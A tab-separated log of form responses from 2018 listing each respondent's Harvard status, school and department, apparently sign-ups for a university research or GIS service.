Timestamp	Your Harvard status/appointment	Your primary affiliated school at Harvard	Your Harvard Department/Unit/Center/Program
7/24/2018 17:10:10	Staff	FAS Social Science Division	CGA/IQSS
7/26/2018 15:02:58	Staff	FAS Arts and Humanities Division	cga
7/26/2018 16:10:38	Graduate student: Masters	Harvard School of Engineering and Applied Sciences (SEAS)	PEEK
8/16/2018 8:20:39	Graduate student: Masters	Harvard Graduate School of Design (GSD)	MDes - Risk and Resilience
8/17/2018 12:22:40	Non-Harvard	Non-Harvard	Collaborating with HMS and HKS
8/20/2018 16:58:11	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Public Policy
8/21/2018 22:06:50	Non-Harvard	Non-Harvard	Economics
8/27/2018 11:36:55	Graduate student: Masters	Harvard Graduate School of Design (GSD)	urban planning and design
8/28/2018 10:31:29	Research fellow	Harvard School of Public Health (HSPH)	Global Health and Population
9/5/2018 10:57:52	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Health Policy
9/5/2018 11:04:09	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Health Policy
9/6/2018 16:37:37	Undergraduate student	Harvard College	Economics
9/7/2018 15:36:20	Staff	Harvard Business School (HBS)	Case Research and Writing Group
9/9/2018 14:25:03	Graduate student: Masters	FAS Division of Continuing Education (DCE)	Intro to GIS
9/9/2018 16:14:47	Non-degree student	FAS Division of Continuing Education (DCE)	Harvard Extension School
9/10/2018 14:40:56	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Sociology
9/10/2018 16:52:41	Graduate student: Masters	Harvard Graduate School of Design (GSD)	Master in Design Studies - Urbanism, Landscape, Ecology
9/10/2018 22:24:23	Staff	FAS Arts and Humanities Division	Harvard Art Museums/extension school student
9/11/2018 8:39:19	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	OEB
9/12/2018 8:45:29	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Public Policy
9/13/2018 13:56:32	Staff	FAS other units	Ukrainian Research Institute
9/13/2018 20:42:43	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Education
9/14/2018 14:38:09	Staff	Harvard Graduate School of Design (GSD)	Joint Center for Housing Studies
9/14/2018 16:08:17	Post doctoral research associate	Harvard School of Engineering and Applied Sciences (SEAS)	Harvard-China Project
9/17/2018 14:30:04	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
9/17/2018 22:52:46	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
9/18/2018 9:59:33	Graduate student: Doctorate	Graduate School of Arts and Sciences (GSAS)	Government
9/18/2018 16:22:25	Post doctoral research associate	Harvard School of Engineering and Applied Sciences (SEAS)	SEAS
